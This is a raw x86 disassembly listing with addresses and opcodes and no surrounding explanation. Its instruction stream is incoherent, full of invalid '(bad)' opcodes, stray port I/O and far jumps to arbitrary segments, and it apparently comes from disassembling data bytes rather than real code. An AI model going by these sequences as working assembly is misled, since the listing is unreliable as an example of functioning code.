  42145a:	ficom  DWORD PTR [ecx+0x39]
  42145d:	jmp    0x42147b
  42145f:	mov    esi,0xaa2f0246
  421464:	pop    ds
  421465:	fs mov ebp,0x61261aa2
  42146b:	loop   0x4214b7
  42146d:	adc    al,0x97
  42146f:	rcr    BYTE PTR [ebx-0x35060c64],cl
  421475:	repz and al,0x7a
  421478:	arpl   ax,ax
  42147a:	adc    al,0xb0
  42147c:	cmp    DWORD PTR [ecx+0x44c9a83d],esi
  421482:	retf   0xc1dd
  421485:	sahf   
  421486:	add    dl,BYTE PTR [ebp-0x5b]
  421489:	test   BYTE PTR [ecx+eiz*2+0x42c2cb89],dh
  421490:	jg     0x42145f
  421492:	ror    BYTE PTR [esi+0x4f],1
  421495:	das    
  421496:	lods   al,BYTE PTR ds:[esi]
  421497:	test   al,0x0
  421499:	add    ecx,DWORD PTR [edi-0x128b4485]
  42149f:	jmp    0x42148d
  4214a1:	in     al,dx
  4214a2:	dec    edx
  4214a3:	icebp  
  4214a4:	test   BYTE PTR [esi+0x7e8c4298],ah
  4214aa:	popf   
  4214ab:	mov    ebp,0x62b1cdd2
  4214b0:	adc    DWORD PTR ds:0x98788b,ebx
	...
  421516:	(bad)  
  421517:	repnz test BYTE PTR [eax],bl
  42151a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42151b:	jle    0x4214fb
  42151d:	(bad)  
  42151e:	stc    
  42151f:	test   DWORD PTR [ecx],edx
  421521:	popa   
  421522:	nop
  421523:	push   cs
  421524:	daa    
  421525:	xchg   edx,eax
  421526:	(bad)  
  421527:	popa   
  421528:	add    DWORD PTR [eax],eax
  42152a:	pop    es
  42152b:	add    DWORD PTR [eax],eax
  42152d:	add    BYTE PTR [ecx+0x537381a7],dl
  421533:	cmp    al,0xdc
  421535:	(bad)  
  421536:	xor    eax,DWORD PTR [esi]
  421538:	mov    cl,0x0
  42153a:	stos   DWORD PTR es:[edi],eax
  42153b:	sbb    esi,esp
  42153d:	fiadd  WORD PTR [eax+0x57b90c06]
  421543:	cmp    DWORD PTR [edi],edi
  421545:	mov    BYTE PTR [ebx+0x3b6abe91],dh
  42154b:	lds    ecx,FWORD PTR [ecx]
  42154d:	popf   
  42154e:	fsub   QWORD PTR [ebx-0x43d488]
  421554:	mov    edi,0xe2ee3b51
  421559:	repnz in al,dx
  42155b:	aaa    
  42155c:	retf   0xf95a
  42155f:	ret    
  421560:	out    0xe,al
  421562:	jl     0x42155c
  421564:	xchg   DWORD PTR ds:0xd72e5d0d,esi
  42156a:	sbb    cl,0xca
  42156d:	je     0x421511
  42156f:	xchg   ebp,eax
  421570:	mov    ds:0x86a4ab0a,al
  421575:	inc    eax
  421576:	dec    edx
  421577:	addr16 inc eax
  421579:	jmp    0xa6d8:0xce63e6f1
  421580:	cmp    al,0x87
  421582:	ja     0x4215ba
  421584:	mov    dh,0xe3
  421586:	in     al,dx
  421587:	inc    edx
  421588:	fst    st(1)
  42158a:	jmp    0x4215ac
  42158c:	sahf   
  42158d:	jge    0x4215c6
  42158f:	mov    ebx,DWORD PTR [ebx+0x5e7185cd]
  421595:	mov    eax,ds:0x25c684b9
  42159a:	ds pop es
  42159c:	inc    esi
  42159d:	xor    ebx,DWORD PTR [esi]
  42159f:	add    dl,dh
  4215a1:	repnz pop edx
  4215a3:	pop    esi
  4215a4:	xchg   edx,eax
  4215a5:	mov    dh,0x6a
  4215a7:	cdq    
  4215a8:	scas   al,BYTE PTR es:[edi]
  4215a9:	jb     0x421609
  4215ab:	lea    esp,[ecx]
  4215ad:	xlat   BYTE PTR ds:[ebx]
  4215ae:	outs   dx,BYTE PTR ds:[esi]
  4215af:	mov    edi,0x9af5fe1e
  4215b4:	cld    
  4215b5:	sbb    bl,BYTE PTR [edi-0x636c8e30]
  4215bb:	outs   dx,DWORD PTR ds:[esi]
  4215bc:	icebp  
  4215bd:	frstor [ebp+0x61]
  4215c0:	ds int3 
  4215c2:	xor    ch,BYTE PTR [edi-0x41c65c5]
  4215c8:	daa    
  4215c9:	dec    edx
  4215ca:	or     ecx,edx
  4215cc:	setp   dh
  4215cf:	xchg   edi,eax
  4215d0:	mov    ecx,0xce0ea0e
  4215d5:	sub    eax,DWORD PTR [ebx]
  4215d7:	mov    dl,0xc3
  4215d9:	scas   al,BYTE PTR es:[edi]
  4215da:	clc    
  4215db:	push   ss
  4215dc:	scas   eax,DWORD PTR es:[edi]
  4215dd:	in     al,dx
  4215de:	fld    QWORD PTR [ecx-0x47ba4712]
  4215e4:	fld    DWORD PTR [ecx+ebp*2-0x6b752a47]
  4215eb:	mov    esi,0x1166752a
  4215f0:	and    bh,BYTE PTR [ebx-0x3c]
  4215f3:	jl     0x4215e3
  4215f5:	mov    ebx,0x2863ca33
  4215fa:	sbb    al,0x58
  4215fc:	pop    edi
  4215fd:	dec    esi
  4215fe:	dec    esi
  4215ff:	or     eax,DWORD PTR [ebx+0x1d]
  421602:	or     dl,dh
  421604:	ins    BYTE PTR es:[edi],dx
  421605:	inc    ebx
  421606:	adc    eax,0x2f1ca6e8
  42160b:	jne    0x42159d
  42160d:	sbb    al,0x61
  42160f:	push   edi
  421610:	stos   BYTE PTR es:[edi],al
  421611:	pushf  
  421612:	or     BYTE PTR [ebx-0x1e9b9da9],0x79
  421619:	push   ds
  42161a:	imul   edx,DWORD PTR [ebx-0x56],0x92475186
  421621:	js     0x4215ef
  421623:	pop    edx
  421624:	dec    eax
  421625:	xor    al,0x6d
  421627:	test   al,0xbb
  421629:	mov    ebp,0xaa32b8c5
  42162e:	jbe    0x421663
  421630:	dec    edi
  421631:	mov    edi,0xa6b86d
	...
  421696:	stos   DWORD PTR es:[edi],eax
  421697:	sub    al,0xed
  421699:	stos   BYTE PTR es:[edi],al
  42169a:	out    dx,eax
  42169b:	jmp    0x42168c
  42169d:	sub    eax,0xf9231b1e
  4216a2:	je     0x42168d
  4216a4:	and    DWORD PTR [ebp+0x162dd],eax
  4216aa:	pop    es
  4216ab:	add    DWORD PTR [eax],eax
  4216ad:	add    ch,bh
  4216af:	jp     0x421675
  4216b1:	dec    ebx
  4216b2:	retf   
  4216b3:	push   edi
  4216b4:	sbb    eax,0x5c755ab
  4216b9:	mov    ch,0xee
  4216bb:	cmp    BYTE PTR [edi+0x1faf6ff1],cl
  4216c1:	into   
  4216c2:	mov    edx,0x7d34fa46
  4216c7:	pop    edi
  4216c8:	mov    BYTE PTR fs:[eax],ah
  4216cb:	mov    DWORD PTR [ecx],eax
  4216cd:	pop    esi
  4216ce:	or     DWORD PTR [edi+0xf6eda3e],ebp
  4216d4:	ja     0x421688
  4216d6:	inc    edi
  4216d7:	mov    fs,WORD PTR [ebx+0x18e66b53]
  4216dd:	mov    ch,0xe9
  4216df:	out    0xa4,al
  4216e1:	mov    ah,0x36
  4216e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216e4:	jnp    0x421763
  4216e6:	je     0x42169e
  4216e8:	cwde   
  4216e9:	dec    ecx
  4216ea:	push   0xbf96e43d
  4216ef:	push   0xd6f930ba
  4216f4:	jmp    0x421705
  4216f6:	mov    WORD PTR [edi+eiz*4],cs
  4216f9:	push   ss
  4216fa:	add    al,0xad
  4216fc:	push   ebp
  4216fd:	lock sbb esp,0x19
  421701:	mov    eax,0x3abe130e
  421706:	fbld   TBYTE PTR [ebp+0x12]
  421709:	loopne 0x421785
  42170b:	fs lahf 
  42170d:	and    ebp,DWORD PTR [edx+0x3d]
  421710:	test   al,0x64
  421712:	inc    ecx
  421713:	sub    BYTE PTR [ebx+0x7b],ah
  421716:	jbe    0x42176c
  421718:	(bad)  
  42171a:	lock and WORD PTR [esi+0x57],si
  42171f:	(bad)  
  421720:	jmp    0x42179b
  421722:	sbb    BYTE PTR [ebp+0x2556e244],0xa8
  421729:	jno    0x4216bd
  42172b:	bound  ebp,QWORD PTR [edi+0xc]
  42172e:	sub    ebp,ebx
  421730:	jge    0x421751
  421732:	and    cl,BYTE PTR [ebx-0x11]
  421735:	cs pop esp
  421737:	popf   
  421738:	(bad)  
  421739:	jmp    0x421793
  42173b:	ja     0x421711
  42173d:	inc    ebx
  42173e:	leave  
  42173f:	mov    esp,0x518066a9
  421744:	sub    DWORD PTR [eax],0xe3e1b5b0
  42174a:	cmp    al,0x89
  42174c:	jae    0x421729
  42174e:	jb     0x4217ab
  421750:	rcr    BYTE PTR [esi],cl
  421752:	mov    ds:0xa9ac8a90,eax
  421757:	loopne 0x421749
  421759:	out    dx,al
  42175a:	sar    BYTE PTR [edi],cl
  42175c:	das    
  42175d:	adc    ebx,DWORD PTR [eax-0x66]
  421760:	sbb    BYTE PTR [ebx],ch
  421762:	and    esp,DWORD PTR [eax-0x6c4518af]
  421768:	or     edx,DWORD PTR [edi-0x3]
  42176b:	xor    bh,BYTE PTR [edi-0x1e9ae7c8]
  421771:	scas   eax,DWORD PTR es:[edi]
  421772:	retf   
  421773:	retf   0x1c00
  421776:	cmp    al,0xbf
  421778:	pusha  
  421779:	out    0xdc,al
  42177b:	pop    esp
  42177c:	in     eax,0x53
  42177e:	mov    eax,0xedec411e
  421783:	imul   edx,edi,0x6e
  421786:	ret    0xec0a
  421789:	popa   
  42178a:	push   edi
  42178b:	xor    al,0x3f
  42178d:	pop    edx
  42178e:	in     al,0xe1
  421790:	push   ss
  421791:	retf   0x76ad
  421794:	xchg   BYTE PTR [ecx],dh
  421796:	inc    esp
  421797:	fdivr  QWORD PTR [ecx-0x5]
  42179a:	jb     0x421768
  42179c:	or     DWORD PTR [esi],0xc9f8a38c
  4217a2:	mov    ebx,0x58997be9
  4217a7:	xor    bl,BYTE PTR [ebp+0x2]
  4217aa:	shl    BYTE PTR [edi+0x4e57c43d],cl
  4217b0:	and    bl,BYTE PTR [edi+0xdd0aad]
	...
  421816:	shl    DWORD PTR [eax-0x6061f47],1
  42181c:	fnstenv [ecx-0x7ac22162]
  421822:	mov    ecx,0xe4feb1df
  421827:	arpl   WORD PTR [ecx],ax
  421829:	add    BYTE PTR [edi],al
  42182b:	add    DWORD PTR [eax],eax
  42182d:	add    cl,ah
  42182f:	imul   edx,esp,0xffffffb9
  421832:	pop    ss
  421833:	data16 fistp QWORD PTR [ebp-0x17]
  421837:	dec    edi
  421838:	inc    edi
  421839:	or     cl,BYTE PTR [edi+0x3d0166f1]
  42183f:	mov    ds:0x1e370d96,al
  421844:	ds pusha 
  421846:	jp     0x421861
  421848:	push   cs
  421849:	neg    BYTE PTR [ebp-0xe7ef0b1]
  42184f:	jp     0x4218bc
  421851:	imul   ebp,DWORD PTR [edi],0x1542633c
  421857:	iret   
  421858:	mov    ds:0x7c4d6ed1,al
  42185d:	adc    al,0x7e
  42185f:	outs   dx,DWORD PTR ds:[esi]
  421860:	inc    esp
  421861:	pop    ebp
  421862:	(bad)  
  421864:	mov    BYTE PTR [edx+edi*2],ah
  421867:	adc    al,0xa3
  421869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42186a:	pop    ebx
  42186b:	mov    ah,0x6d
  42186d:	sub    BYTE PTR [edx-0x12],0x39
  421871:	push   ss
  421872:	(bad)  
  421873:	mov    ch,0x37
  421875:	repz and edx,DWORD PTR [bp+si-0x7e2c]
  42187b:	js     0x42189d
  42187d:	cwde   
  42187e:	xor    dh,0xba
  421881:	cmp    al,0xaa
  421883:	lods   al,BYTE PTR ds:[esi]
  421884:	and    dl,BYTE PTR [ecx]
  421886:	stos   DWORD PTR es:[edi],eax
  421887:	mov    cl,0x47
  421889:	out    0xb,al
  42188b:	dec    esp
  42188c:	(bad)  
  42188d:	push   ebp
  42188e:	xchg   ecx,eax
  42188f:	ret    0x3975
  421892:	pop    ecx
  421893:	jbe    0x4218f9
  421895:	add    ch,al
  421897:	jae    0x42182b
  421899:	jns    0x4218b5
  42189b:	inc    edi
  42189c:	jns    0x421826
  42189e:	lods   al,BYTE PTR ds:[esi]
  42189f:	push   0x830ac169
  4218a4:	push   es
  4218a5:	xlat   BYTE PTR ds:[ebx]
  4218a6:	xchg   BYTE PTR [edx-0x3af51815],al
  4218ac:	sub    al,BYTE PTR [edx+0x0]
  4218af:	mov    eax,0x314372ef
  4218b4:	dec    ebp
  4218b5:	repnz stc 
  4218b7:	ins    BYTE PTR es:[edi],dx
  4218b8:	dec    ecx
  4218b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218ba:	adc    al,0xf7
  4218bc:	sar    bl,cl
  4218be:	inc    ebx
  4218bf:	jns    0x421916
  4218c1:	(bad)  
  4218c2:	(bad)  [ebx-0x7dcafb6d]
  4218c8:	dec    esp
  4218c9:	fisubr WORD PTR [esi-0x8]
  4218cc:	dec    ecx
  4218cd:	aaa    
  4218ce:	sbb    eax,0x9ee50c38
  4218d3:	push   ss
  4218d4:	(bad)  
  4218d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218d7:	xchg   ebp,eax
  4218d8:	outs   dx,DWORD PTR ds:[esi]
  4218d9:	xor    DWORD PTR [esp+esi*1+0x1b],ebp
  4218dd:	sub    eax,0xf34df6
  4218e2:	or     al,0x5c
  4218e4:	leave  
  4218e5:	call   0xce8e:0x255767d5
  4218ec:	cdq    
  4218ed:	test   cl,ah
  4218ef:	(bad)  
  4218f0:	xor    BYTE PTR [eax],ah
  4218f2:	ja     0x421923
  4218f4:	or     eax,DWORD PTR [edi+ebp*2+0x77]
  4218f8:	cmp    BYTE PTR [edi+0x0],cl
  4218fb:	jmp    0x3b7de2e9
  421900:	jbe    0x421980
  421902:	cmp    DWORD PTR [ecx+eiz*1],esp
  421905:	mov    ch,ch
  421907:	in     al,dx
  421908:	lock test bl,bh
  42190b:	mov    eax,ds:0x38a8c24
  421910:	inc    edi
  421911:	sti    
  421912:	dec    esi
  421913:	scas   eax,DWORD PTR es:[edi]
  421914:	fisttp QWORD PTR [ecx+0x2e]
  421917:	mov    ebx,0x8cea68f8
  42191c:	pop    edx
  42191d:	sbb    edx,0x41
  421920:	jle    0x4218b8
  421922:	push   0xffffffaa
  421924:	pop    ebp
  421925:	pop    edx
  421926:	mov    esi,0xd860ae07
  42192b:	xor    DWORD PTR [ebx],0x65
  42192e:	scas   eax,DWORD PTR es:[edi]
  42192f:	sar    BYTE PTR [ebp-0x66],cl
  421932:	jg     0x421934
  421934:	je     0x421936
	...
  421996:	(bad)  
  421997:	cld    
  421998:	je     0x4219b7
  42199a:	jbe    0x421939
  42199c:	(bad)  
  42199d:	dec    DWORD PTR [ebx-0x3d]
  4219a0:	rcl    DWORD PTR [edx-0x5da6a5b4],0xeb
  4219a7:	add    DWORD PTR fs:[eax],eax
  4219aa:	pop    es
  4219ab:	add    DWORD PTR [eax],eax
  4219ad:	add    BYTE PTR [ebx],bl
  4219af:	pop    es
  4219b0:	dec    ecx
  4219b1:	dec    ebp
  4219b2:	ret    0x58b5
  4219b5:	stos   BYTE PTR es:[edi],al
  4219b6:	enter  0x53c5,0x13
  4219ba:	add    eax,0x110ad829
  4219bf:	dec    esi
  4219c0:	jmp    0xb2e9:0x8f086258
  4219c7:	js     0x421994
  4219c9:	push   DWORD PTR [ebp+0x20d8e949]
  4219cf:	jbe    0x4219d9
  4219d1:	sbb    al,0x12
  4219d3:	cmp    edi,DWORD PTR [esi]
  4219d5:	xchg   ebx,eax
  4219d6:	adc    al,0xc1
  4219d8:	pop    ebp
  4219d9:	add    al,0x4c
  4219db:	sub    al,0xe8
  4219dd:	dec    eax
  4219de:	loopne 0x4219e7
  4219e0:	lahf   
  4219e1:	ins    DWORD PTR es:[edi],dx
  4219e2:	mov    ss,WORD PTR [edx+0x7699af07]
  4219e8:	push   esp
  4219e9:	pushf  
  4219ea:	jns    0x421a5e
  4219ec:	sar    eax,0x7e
  4219ef:	out    dx,al
  4219f0:	pop    es
  4219f1:	adc    bh,BYTE PTR [eax+0x743a283b]
  4219f7:	scas   eax,DWORD PTR es:[edi]
  4219f8:	mov    al,ds:0xd31844fe
  4219fd:	mov    esi,0x2c1dcbce
  421a02:	or     BYTE PTR [esi],0x92
  421a05:	call   0xc3208f64
  421a0a:	stc    
  421a0b:	je     0x4219c3
  421a0d:	popa   
  421a0e:	jg     0x4219fb
  421a10:	stos   DWORD PTR es:[edi],eax
  421a11:	jno    0x4219ef
  421a13:	test   BYTE PTR ds:[edx+0x41e622a5],dh
  421a1a:	mov    cl,0x55
  421a1c:	push   esp
  421a1d:	pop    ebp
  421a1e:	mov    eax,ds:0x67a4990d
  421a23:	pop    eax
  421a24:	int    0xab
  421a26:	jo     0x421a80
  421a28:	es mov dh,0x1e
  421a2b:	sub    dl,0x3b
  421a2e:	pop    eax
  421a2f:	test   BYTE PTR [ebp-0x5209ffc3],ch
  421a35:	iret   
  421a36:	or     edx,edi
  421a38:	mov    ebx,0x4bc33570
  421a3d:	outs   dx,BYTE PTR ds:[esi]
  421a3e:	(bad)  
  421a3f:	aad    0xdd
  421a41:	xor    cl,BYTE PTR [eax-0x7a]
  421a44:	aad    0xac
  421a46:	mov    gs,edx
  421a48:	js     0x4219e1
  421a4a:	lahf   
  421a4b:	fimul  DWORD PTR [edi+0x5eb1df0f]
  421a51:	ins    DWORD PTR es:[edi],dx
  421a52:	repnz push 0xffffffeb
  421a55:	scas   eax,DWORD PTR es:[edi]
  421a56:	pop    edi
  421a57:	mov    BYTE PTR [edi],cl
  421a59:	pop    ss
  421a5a:	or     al,0xf7
  421a5c:	inc    esp
  421a5d:	aaa    
  421a5e:	mov    ah,0xae
  421a60:	dec    ebx
  421a61:	test   DWORD PTR [edi+0x46f07f0a],edi
  421a67:	retf   0xb218
  421a6a:	or     BYTE PTR [eax+eiz*1+0x2e],cl
  421a6e:	ins    DWORD PTR es:[edi],dx
  421a6f:	mov    ah,0x7c
  421a71:	xchg   esi,eax
  421a72:	in     al,dx
  421a73:	ja     0x421a85
  421a75:	mov    esi,0xcca4b1e6
  421a7a:	loopne 0x421a4e
  421a7c:	call   0xee35:0x2fe079f6
  421a83:	fs pop esi
  421a85:	or     al,0x69
  421a87:	sbb    BYTE PTR [eax],bl
  421a89:	mov    esp,DWORD PTR [edx+0x602e34cc]
  421a8f:	xor    eax,0x679ae276
  421a94:	push   edx
  421a95:	sbb    eax,0xd5a79998
  421a9a:	js     0x421a63
  421a9c:	jno    0x421b08
  421a9e:	mov    ss,WORD PTR [ebx-0x391fe2ab]
  421aa4:	sub    eax,0xca9bebbd
  421aa9:	push   ss
  421aaa:	add    ch,BYTE PTR [edx+edx*2]
  421aad:	mov    ds:0x6acf4037,eax
  421ab2:	shl    al,cl
  421ab4:	or     DWORD PTR [eax],eax
	...
  421b16:	push   ss
  421b17:	cdq    
  421b18:	jmp    0x37400aea
  421b1d:	fcmovnu st,st(5)
  421b1f:	sahf   
  421b20:	test   DWORD PTR [edx+0x9ffbccd],0x165f2
  421b2a:	pop    es
  421b2b:	add    DWORD PTR [eax],eax
  421b2d:	add    dl,bl
  421b2f:	add    al,0x90
  421b31:	add    ch,BYTE PTR [edx+0x662f69d2]
  421b37:	jns    0x421b55
  421b39:	arpl   WORD PTR [ecx-0x3affcab3],dx
  421b3f:	mov    esp,0xda13b27c
  421b44:	sbb    BYTE PTR [ebx+0x36a4f24b],bl
  421b4a:	in     eax,0x3b
  421b4c:	dec    edi
  421b4d:	adc    ebx,esp
  421b4f:	inc    eax
  421b50:	ja     0x421b5e
  421b52:	out    0xb6,al
  421b54:	xchg   edi,eax
  421b55:	pop    ebp
  421b56:	and    DWORD PTR [edi+0x72f6fee5],0x5a94e49b
  421b60:	ss pusha 
  421b62:	pop    ebp
  421b63:	mov    ?,WORD PTR [edx]
  421b65:	mov    al,0x2c
  421b67:	shr    DWORD PTR [edx],cl
  421b69:	sbb    ebp,esi
  421b6b:	(bad)  
  421b6c:	in     eax,0xf0
  421b6e:	mov    dh,0x18
  421b70:	sub    DWORD PTR [esi-0x37c7745c],esp
  421b76:	(bad)  
  421b77:	sbb    al,BYTE PTR [ebx-0xacab8a7]
  421b7d:	or     esp,DWORD PTR [ebp-0x80]
  421b80:	ja     0x421bd0
  421b82:	xchg   ebp,eax
  421b83:	mov    ch,0x54
  421b85:	push   ecx
  421b86:	xchg   edx,eax
  421b87:	cmp    DWORD PTR [esi-0x51],ebx
  421b8a:	test   eax,0x7b0ba7b9
  421b8f:	xor    eax,DWORD PTR es:[edi]
  421b92:	nop
  421b93:	and    ch,dl
  421b95:	test   al,0x35
  421b97:	daa    
  421b98:	mov    WORD PTR [edi],fs
  421b9a:	ds jge 0x421b70
  421b9d:	in     al,dx
  421b9e:	and    BYTE PTR [edi+ebx*1],bl
  421ba1:	mov    WORD PTR [eax],fs
  421ba3:	popa   
  421ba4:	retf   
  421ba5:	in     eax,0xbc
  421ba7:	jae    0x421b5c
  421ba9:	pop    ss
  421baa:	(bad)  
  421bab:	push   ebp
  421bac:	rol    DWORD PTR [edi+0x6b],1
  421baf:	inc    ecx
  421bb0:	jo     0x421c23
  421bb2:	repnz mov cl,0x4a
  421bb5:	jno    0x421c35
  421bb7:	outs   dx,BYTE PTR ds:[esi]
  421bb8:	fimul  WORD PTR [edx]
  421bba:	das    
  421bbb:	ds push 0xfffffffd
  421bbe:	inc    edi
  421bbf:	add    BYTE PTR [eax],0xe3
  421bc2:	pushf  
  421bc3:	je     0x421b6e
  421bc5:	lods   al,BYTE PTR ds:[esi]
  421bc6:	leave  
  421bc7:	and    eax,0xe45d6377
  421bcc:	add    DWORD PTR cs:[edx+0x75],ebx
  421bd0:	cdq    
  421bd1:	je     0x421ba7
  421bd3:	xor    ecx,DWORD PTR [ebp+0xa]
  421bd6:	fild   DWORD PTR [ebx]
  421bd8:	ret    0xbd8d
  421bdb:	pop    es
  421bdc:	loop   0x421c04
  421bde:	mov    BYTE PTR [ebx],0x35
  421be1:	adc    BYTE PTR [ecx-0x170c39b9],cl
  421be7:	scas   eax,DWORD PTR es:[edi]
  421be8:	test   al,0xd9
  421bea:	(bad)  
  421beb:	cmp    ecx,DWORD PTR [esi]
  421bed:	into   
  421bee:	lock xlat BYTE PTR ds:[ebx]
  421bf0:	aad    0xc0
  421bf2:	xor    eax,0x4d759f31
  421bf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bf8:	into   
  421bf9:	dec    eax
  421bfa:	xchg   ebx,eax
  421bfb:	or     eax,0x53
  421bfe:	pop    ecx
  421bff:	les    edi,FWORD PTR [ebx]
  421c01:	xor    al,0x74
  421c03:	pop    ds
  421c04:	mov    edx,0x7e74d097
  421c09:	jno    0x421bfa
  421c0b:	(bad)  
  421c0c:	into   
  421c0d:	mov    eax,ds:0xf3cb7f3b
  421c12:	mov    DWORD PTR [ecx-0x1e],0xf86744a3
  421c19:	push   ss
  421c1a:	mov    esi,es
  421c1c:	cmp    edi,ecx
  421c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c1f:	(bad)  
  421c20:	push   eax
  421c21:	imul   edx,DWORD PTR [esi-0x26d30614],0x16
  421c28:	mov    edx,0xf47bcdfd
  421c2d:	inc    esp
  421c2e:	pop    edi
  421c2f:	push   cs
  421c30:	cmp    DWORD PTR [ebp+0xe24c0c],edx
	...
  421c96:	mov    al,0x6b
  421c98:	mov    ch,0xe5
  421c9a:	(bad)  
  421c9b:	push   eax
  421c9d:	jg     0x421c36
  421c9f:	shl    DWORD PTR [ebp+0xcc4e319],0x97
  421ca6:	stc    
  421ca7:	add    WORD PTR [eax],ax
  421caa:	pop    es
  421cab:	add    DWORD PTR [eax],eax
  421cad:	add    BYTE PTR [esp+0x74e218ef],bl
  421cb4:	adc    al,BYTE PTR [esp+edx*1]
  421cb7:	mov    eax,ds:0xd2a6eb61
  421cbc:	add    BYTE PTR [ecx+0x63],ch
  421cbf:	pop    eax
  421cc0:	arpl   cx,dx
  421cc2:	lds    esp,FWORD PTR [ecx-0x32]
  421cc5:	adc    edx,esp
  421cc7:	fmul   st,st(1)
  421cc9:	aaa    
  421cca:	jns    0x421d29
  421ccc:	jl     0x421d0b
  421cce:	rcr    bh,1
  421cd0:	pop    ecx
  421cd1:	repz sub DWORD PTR [esi-0x56d1ebe],esi
  421cd8:	or     eax,0xf831136b
  421cdd:	lock or DWORD PTR [ebp+0x4d655fb3],0xfffffff4
  421ce5:	mov    DWORD PTR [ebx],0x1b726970
  421ceb:	iret   
  421cec:	stos   DWORD PTR es:[edi],eax
  421ced:	mov    BYTE PTR [edi],ah
  421cef:	sbb    dl,al
  421cf1:	add    dh,BYTE PTR [ecx+0x3806f987]
  421cf7:	xlat   BYTE PTR ds:[ebx]
  421cf8:	push   edi
  421cf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cfa:	das    
  421cfb:	stos   BYTE PTR es:[edi],al
  421cfc:	daa    
  421cfd:	sub    DWORD PTR [edx-0x1dad11b9],ecx
  421d03:	loopne 0x421d55
  421d05:	mov    eax,0x3b89524d
  421d0a:	mov    edx,0x60fc9478
  421d0f:	pop    esp
  421d10:	sbb    BYTE PTR [esi],cl
  421d12:	cmp    ebx,DWORD PTR [edi+0xf]
  421d15:	cld    
  421d16:	mov    DWORD PTR [eax-0x5a],eax
  421d19:	cmp    bh,bh
  421d1b:	enter  0x2abe,0xef
  421d1f:	sbb    BYTE PTR [edx],ch
  421d21:	ficom  DWORD PTR [edx]
  421d23:	gs mov esi,ebx
  421d26:	jmp    0x40c2:0xf59cd346
  421d2d:	ss aad 0x86
  421d30:	fmul   DWORD PTR [ecx]
  421d32:	pop    eax
  421d33:	out    dx,al
  421d34:	ins    DWORD PTR es:[edi],dx
  421d35:	mov    dh,0x32
  421d37:	adc    edx,DWORD PTR [eax+0x67]
  421d3a:	in     eax,0xf2
  421d3c:	adc    BYTE PTR [edi],al
  421d3e:	sbb    al,0x9f
  421d40:	mov    esi,0x435ae316
  421d45:	cmp    eax,0x65398abc
  421d4a:	(bad)  
  421d4b:	loope  0x421d90
  421d4d:	ss aam 0xbc
  421d50:	push   ds
  421d51:	shr    BYTE PTR [eax-0x29114780],cl
  421d57:	lds    eax,FWORD PTR [ecx+0x7205e33d]
  421d5d:	mov    eax,0x4414fea
  421d62:	lea    edx,ds:0x51eb5a31
  421d68:	or     eax,0x553e3ffc
  421d6d:	and    ch,ah
  421d6f:	idiv   ah
  421d71:	sub    ebx,esi
  421d73:	jae    0x421d4c
  421d75:	jmp    0x421dc9
  421d77:	push   eax
  421d78:	cld    
  421d79:	cmp    BYTE PTR [esi],bl
  421d7b:	out    0x7f,eax
  421d7d:	or     eax,0xe310fef
  421d82:	repnz inc esp
  421d84:	add    al,0xf9
  421d86:	sbb    al,ch
  421d88:	mov    ds:0x2cce3628,eax
  421d8d:	or     dh,cl
  421d8f:	aam    0x34
  421d91:	(bad)  
  421d92:	loope  0x421dd5
  421d94:	and    DWORD PTR [ecx+edx*2-0x5df1bbe],0xafbf1a3f
  421d9f:	aad    0x9
  421da1:	ror    BYTE PTR ss:[ebp-0x2f],1
  421da5:	xchg   ebx,eax
  421da6:	mov    dh,0x4d
  421da8:	pop    ebp
  421da9:	sbb    bh,BYTE PTR [ecx-0x74012fcf]
  421daf:	xor    ebp,0xdfe94410
	...
  421e15:	add    bh,cl
  421e17:	mov    eax,ds:0xbf7f851b
  421e1c:	fucomip st,st(3)
  421e1e:	lock jbe 0x421e3b
  421e21:	cmp    ah,ah
  421e23:	int3   
  421e24:	cmp    DWORD PTR [edi+0x0],ebp
  421e27:	push   0x1070001
  421e2c:	add    BYTE PTR [eax],al
  421e2e:	call   0x46e7022c
  421e33:	fist   WORD PTR [edx]
  421e35:	or     ch,BYTE PTR [ecx+0x66]
  421e38:	outs   dx,DWORD PTR ds:[esi]
  421e39:	lahf   
  421e3a:	mov    edi,0xb927ac35
  421e3f:	hlt    
  421e40:	dec    ebx
  421e41:	adc    eax,0x7559ed30
  421e46:	fwait
  421e47:	add    edx,0x890dc14
  421e4d:	mov    dl,0xbe
  421e4f:	pusha  
  421e50:	fdiv   DWORD PTR [edx]
  421e52:	xchg   edx,eax
  421e53:	mov    edi,0xf6b30b5d
  421e58:	pushf  
  421e59:	dec    ebx
  421e5a:	pop    ebp
  421e5b:	aam    0x64
  421e5d:	xor    eax,0xe608287b
  421e62:	int    0xb7
  421e64:	stos   BYTE PTR es:[edi],al
  421e65:	stos   BYTE PTR es:[edi],al
  421e66:	fisubr WORD PTR [ebx+0x17]
  421e69:	fbld   TBYTE PTR [esi+edx*8-0x1f]
  421e6d:	bound  esi,QWORD PTR [eax-0x2d]
  421e70:	sbb    bl,ch
  421e72:	popf   
  421e73:	cli    
  421e74:	into   
  421e75:	cld    
  421e76:	inc    eax
  421e77:	sldt   WORD PTR [ebp+ebp*2+0x7a3a9299]
  421e7f:	scas   eax,DWORD PTR es:[edi]
  421e80:	push   edi
  421e81:	xchg   edi,eax
  421e82:	jg     0x421ea0
  421e84:	test   eax,0xc0eb7a67
  421e89:	and    esi,DWORD PTR [esi+0x58]
  421e8c:	in     al,dx
  421e8d:	inc    ebx
  421e8e:	aaa    
  421e8f:	fs jo  0x421e5c
  421e92:	ins    DWORD PTR es:[edi],dx
  421e93:	mov    ecx,0x9bb6b4cf
  421e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e99:	lods   eax,DWORD PTR ds:[esi]
  421e9a:	jnp    0x421e5b
  421e9c:	fimul  WORD PTR [edx]
  421e9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e9f:	add    edi,DWORD PTR [edi+0x2e]
  421ea2:	in     eax,0xa
  421ea4:	inc    esi
  421ea5:	fstp   TBYTE PTR [edx-0x8]
  421ea8:	sub    BYTE PTR [eax-0x4e631a08],ch
  421eae:	test   DWORD PTR [eax+0x15],ecx
  421eb1:	(bad)  
